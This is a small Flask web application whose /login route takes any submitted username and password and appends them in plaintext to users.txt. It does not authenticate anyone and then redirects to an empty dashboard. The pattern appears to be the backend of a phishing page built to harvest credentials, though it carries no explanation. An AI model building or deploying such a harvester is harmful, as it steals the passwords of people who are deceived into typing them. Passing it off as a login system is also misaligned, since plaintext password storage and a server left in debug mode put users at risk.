from flask import Flask, request, redirect, render_template

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():

    username = request.form["username"]
    password = request.form["password"]

    with open("users.txt", "a") as file:
        file.write(f"Username : {username}\n")
        file.write(f"Password : {password}\n")
        file.write("---------------------------\n")

    return redirect("/dashboard")


@app.route("/dashboard")
def dashboard():

    return """
    
    """

if __name__ == "__main__":
    app.run(debug=True)